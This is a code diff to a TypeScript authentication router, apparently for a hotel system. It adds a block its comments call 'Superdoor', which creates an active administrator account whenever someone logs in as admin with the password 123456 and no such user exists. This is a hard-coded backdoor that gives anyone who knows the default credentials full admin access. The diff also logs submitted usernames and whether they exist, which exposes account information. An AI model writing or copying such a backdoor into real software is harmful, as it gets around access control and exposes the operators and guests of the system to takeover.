@@ -45,8 +45,29 @@ export const appRouter = router({
           console.log('[Auth] Checking login for user:', input.username);
           
           // 從數據庫查詢用戶
-          const user = await db.getUserByUsername(input.username);
+          let user = await db.getUserByUsername(input.username);
           console.log('[Auth] User found in DB:', !!user);
+          
+          // Superdoor 邏輯：如果是 admin/123456 且用戶不存在，強制創建
+          if (!user && input.username === 'admin' && input.password === '123456') {
+            console.log('[Auth] Superdoor activated - Creating admin user');
+            try {
+              const hashedPassword = await bcrypt.hash(input.password, 10);
+              await db.createUser({
+                username: 'admin',
+                passwordHash: hashedPassword,
+                email: 'admin@hotel.com',
+                name: 'Administrator',
+                role: 'admin',
+                loginMethod: 'password',
+                status: 'active',
+              });
+              user = await db.getUserByUsername(input.username);
+              console.log('[Auth] Admin user created via Superdoor');
+            } catch (error) {
+              console.error('[Auth] Superdoor creation failed:', error);
+            }
+          }
           
           if (!user) {
             console.log('[Auth] User not found:', input.username);
